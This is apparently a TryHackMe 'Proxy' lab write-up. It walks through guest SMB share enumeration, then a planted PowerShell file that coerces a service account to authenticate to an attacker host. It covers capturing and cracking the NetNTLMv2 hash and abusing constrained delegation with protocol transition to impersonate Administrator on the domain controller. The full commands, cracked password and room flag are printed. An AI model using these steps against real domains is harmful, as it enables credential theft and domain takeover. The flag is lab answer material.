---
title: "TryHackMe Proxy: Coerced Hash to Constrained Delegation"
date: 2026-09-30T10:16:00+05:30
lastmod: 2026-09-30T10:16:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-proxy/00-thumbnail.png

categories:
  - TryHackMe

tags:
  - tryhackme
  - thm
  - rooms
  - Active Directory
  - AD Security Testing Basics
  - Jr Penetration Tester
  - constrained delegation
  - S4U2Proxy
  - Kerberos
  - Responder
  - NetNTLMv2
  - coerced authentication
  - NetExec
  - impacket
  - john the ripper

draft: false
description: "TryHackMe Proxy walkthrough: a writable SMB share that executes PowerShell, a coerced NetNTLMv2 hash, and Kerberos constrained delegation to Administrator on the DC."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Proxy |![Proxy room icon](https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1779364439801)|

**Proxy** is the challenge box that closes out the Active Directory Security Testing Basics module, after the guided rooms [Intro to Credential Harvesting](/post/thm-room-introtocredentialharvesting/) and [Intro to AD Lateral Movement](/post/thm-room-introductiontoadlateralmovement/). No tasks, no hints, one question: what is the Administrator flag. The blurb is the only steer you get, and in hindsight it is an accurate one: "Every request has to go through someone... but what if that someone is you?"

Up front, the honest part: I burned two full lab sessions on this and did not get it on my own. I had the right shape of the attack and the wrong mechanism, and I only unstuck it by reading public writeups. That mistake is the most useful thing in this post, so it stays in.

The target is a single domain controller, `DC01.ctf.local`, on `ctf.local`.

## Recon: guest is enabled, and one share is writable

A full `-p-` scan returns nothing but a textbook DC: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 9389 and the usual high RPC range. No web server, so "Proxy" in the title is not a service you go and find. It is the technique.

The way in is that `guest` authenticates with an empty password, and guest is enough to list shares:

```bash
nxc smb 10.48.172.101 -u guest -p '' --shares
```

![NetExec share enumeration as guest against DC01 showing IT-Shared with READ,WRITE permissions](/img/thm-proxy/01-nxc-guest-shares.png)

`IT-Shared` is **READ,WRITE** to a guest session on a domain controller. RID brute (also as guest) gives the account list: `svc.scanner`, `svc.mssql`, `helpdesk.bob`, `it.admin`, plus the built-ins.

The share holds three files. `IT-Credentials-Backup.txt` hands over `helpdesk.bob:Welcome123!` and `it.admin:ITAdmin2019!` and is a rabbit hole: both accounts are disabled, and authenticating with those passwords succeeds only by getting mapped to Guest. `IT-Portal.html` is a fake dashboard. The one that matters is `IT-Onboarding-Checklist.txt`:

![The Automated Services section of the onboarding checklist describing the svc.scanner file scanner, next to the one-line PowerShell payload dropped into the share](/img/thm-proxy/02-scanner-doc-payload.png)

> File Scanner (svc.scanner). Runs every 2 minutes. Enumerates IT-Shared for new files to process. Uses Shell enumeration to inspect file metadata and icons.

## The mistake: "icons" is a lie

Read that line as an attacker and it says *coerce me with an icon*. So that is what I did, at length: a `.url` with `IconFile=\\attacker\share\icon.ico`, a `.lnk` from `nxc -M slinky`, `desktop.ini` with `IconResource`, an `.scf`, and a `.library-ms`. I bound `impacket smbserver.py` on 445 (after killing the AttackBox's own `smbd`, which otherwise squats the port and silently answers the callback you are waiting for), and I watched with `tcpdump -ni ens5 "src host <DC> and tcp[tcpflags] & tcp-syn != 0"`.

Across two separate deployments, three separate capture windows and six file types, the DC initiated **zero** connections. Not a single inbound SYN.

The frustrating part is that I could prove the return path was fine the whole time. `nxc smb <dc> -u guest -p '' -M coerce_plus` reports the DC VULNERABLE to PetitPotam, PrinterBug and MSEven, and firing PrinterBug produced an immediate inbound SMB connection to my listener. So the network was never the problem, and I spent an hour chasing a relay chain instead: the DC refuses a reflected machine-account relay to its own LDAP (`Authenticating against ldap:// as CTF/DC01$ FAILED`), and the LDAPS variant dies inside the AttackBox's Python 3.8 TLS stack. Both dead ends, both self-inflicted.

What the scanner actually does is **execute `.ps1` files it finds in the share**. The word "icons" is scenery. Once you know that, the payload is one line:

```bash
echo 'Get-ChildItem \\10.48.66.22\icons\' > scan.ps1
smbclient //10.48.172.101/IT-Shared -U 'guest%' -c 'put scan.ps1 scan.ps1'
```

Two minutes later `svc.scanner` runs it, PowerShell resolves the UNC path, and Windows authenticates to a host that is not in the domain.

{{< ad >}}

## Capturing and cracking

Responder is the right listener here. `smbserver.py` sees the connection but does not complete the NTLM exchange in a way that logs a usable hash; Responder writes it straight to `/usr/local/Responder/logs/SMB-NTLMv2-SSP-<ip>.txt`.

```bash
responder -I ens5 -dwv
  # then re-upload the ps1, wait one scanner cycle
john --format=netntlmv2 h.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![Responder capturing the svc.scanner NetNTLMv2 hash from the DC, and John cracking it to 1summerlove](/img/thm-proxy/03-responder-john.png)

`svc.scanner : 1summerlove!`. Worth noting the room does not let you shortcut this: WinRM is not open, and `svc.scanner`'s credential gives you nothing on SMB beyond what guest already had.

## Constrained delegation with protocol transition

This is where the room name finally makes sense. One LDAP query as `svc.scanner` explains everything:

```bash
nxc ldap 10.48.172.101 -u svc.scanner -p '1summerlove!' --find-delegation
```

![NetExec find-delegation showing svc.scanner configured for Constrained delegation with Protocol Transition to cifs/DC01.ctf.local, followed by getST requesting S4U2Self and S4U2Proxy](/img/thm-proxy/04-delegation-getst.png)

`svc.scanner` carries `msDS-AllowedToDelegateTo: cifs/DC01.ctf.local` with **protocol transition**. Protocol transition is the dangerous half: with it, the account can call S4U2Self to mint a ticket *to itself* for any user it names, without that user ever authenticating, and then feed that ticket into S4U2Proxy to reach the delegated service. Name Administrator and you get a CIFS ticket for Administrator on the domain controller.

```bash
getST.py -spn cifs/DC01.ctf.local -impersonate Administrator \
  -dc-ip 10.48.172.101 'ctf.local/svc.scanner:1summerlove!'
```

Point `KRB5CCNAME` at the resulting ccache (impacket reads the ticket from that environment variable and nowhere else) and walk in:

```bash
export KRB5CCNAME=/root/px/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
wmiexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local \
  "cmd /c type C:\Users\Administrator\Desktop\flag.txt"
```

![wmiexec running with the impersonated Administrator Kerberos ticket and printing the flag from the Administrator Desktop on DC01](/img/thm-proxy/05-wmiexec-flag.png)

The flag is **THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}**, which is the room telling you exactly what it wanted the whole time. Add `/etc/hosts` entries for `dc01.ctf.local` first, since Kerberos will not work against a bare IP.

## Two things worth keeping

**Scenario text is written by a person, not generated from the machine.** "Uses Shell enumeration to inspect file metadata and icons" is not a specification, it is flavour, and I treated it as ground truth for two sessions. The falsifiable claim was "the scanner reaches out when it reads a file", and I confirmed with packet capture that it never did. That should have redirected me to *what else could a thing that processes files in a share possibly do* within about ten minutes. Instead I kept building better icons. When your evidence contradicts the briefing, believe the evidence and re-derive the mechanism.

**Protocol transition is the setting that turns constrained delegation into domain compromise.** Constrained delegation alone means the account can reuse a ticket a real user already presented. With `TRUSTED_TO_AUTH_FOR_DELEGATION` it can manufacture that user's ticket from nothing, so the account is functionally equivalent to every identity it can impersonate, including Administrator. When you own any service account, `--find-delegation` costs one query and is worth running before anything cleverer.

Credit where it is due: I got the `.ps1` mechanism from the public writeups by [Xiro0x01](https://medium.com/@Xiro0x01/tryhackme-proxy-room-writeup-088cc0d6b463), [happycamper84](https://happycamper84.medium.com/tryhackme-proxy-walkthrough-cd6e69bcc205) and [InfoSec Write-ups](https://infosecwriteups.com/proxy-tryhackme-active-directory-write-up-24cd64923aea), after my own attempts stalled. The delegation half I had already mapped, but the foothold was theirs.

Room solved 100%: 1 task, 1 answer.
